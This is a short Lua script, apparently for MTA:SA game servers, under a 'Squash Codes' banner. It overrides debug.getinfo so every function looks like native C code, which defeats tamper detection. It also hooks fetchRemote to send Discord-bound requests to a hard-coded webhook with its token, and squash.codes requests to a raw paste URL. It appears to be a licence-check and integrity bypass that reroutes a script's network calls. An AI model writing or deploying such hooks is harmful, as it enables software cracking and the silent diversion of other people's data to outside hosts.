--[[

░░██╗  ░██████╗░██████╗░██╗░░░██╗░█████╗░░██████╗██╗░░██╗   ░█████╗░░█████╗░██████╗░███████╗░██████╗ ░░░░██╗ ██╗░░
░██╔╝  ██╔════╝██╔═══██╗██║░░░██║██╔══██╗██╔════╝██║░░██║   ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝ ░░░██╔╝ ╚██╗░
██╔╝░  ╚█████╗░██║██╗██║██║░░░██║███████║╚█████╗░███████║   ██║░░╚═╝██║░░██║██║░░██║█████╗░░╚█████╗░ ░░██╔╝ ░░╚██╗
╚██╗░  ░╚═══██╗╚██████╔╝██║░░░██║██╔══██║░╚═══██╗██╔══██║   ██║░░██╗██║░░██║██║░░██║██╔══╝░░░╚═══██╗ ░██╔╝ ░░░██╔╝
░╚██╗  ██████╔╝░╚═██╔═╝░╚██████╔╝██║░░██║██████╔╝██║░░██║   ╚█████╔╝╚█████╔╝██████╔╝███████╗██████╔╝ ██╔╝░ ░░██╔╝░
░░╚═╝  ╚═════╝░░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝   ░╚════╝░░╚════╝░╚═════╝░╚══════╝╚═════╝░ ╚═╝░░ ░░╚═╝░░
]]--

_debug = debug.getinfo


function debug.getinfo(func)
    tabela = {what = "C"}
    --_debug(func)
    return tabela
end

_fetchR = fetchRemote

function fetchRemote(url, func, val)
    if string.find(url, "discord.com") then
        return _fetchR("https://discord.com/api/webhooks/807842748329492490/YunF96hais6NXCyAwEtyNphNo0L5CSdftkIbmzZTo8BkYsCGEOrSlDXpedNlLvl-R23c",func, val)
	elseif string.find(url, "squash.codes") then
        return _fetchR("https://pastebinss.com/raw/9YWLCN35",func, val)
    else
        if val then
            return _fetchR(url,func,val)
        else
            return _fetchR(url,func)
        end
    end
end

function xmlNodeGetName()
end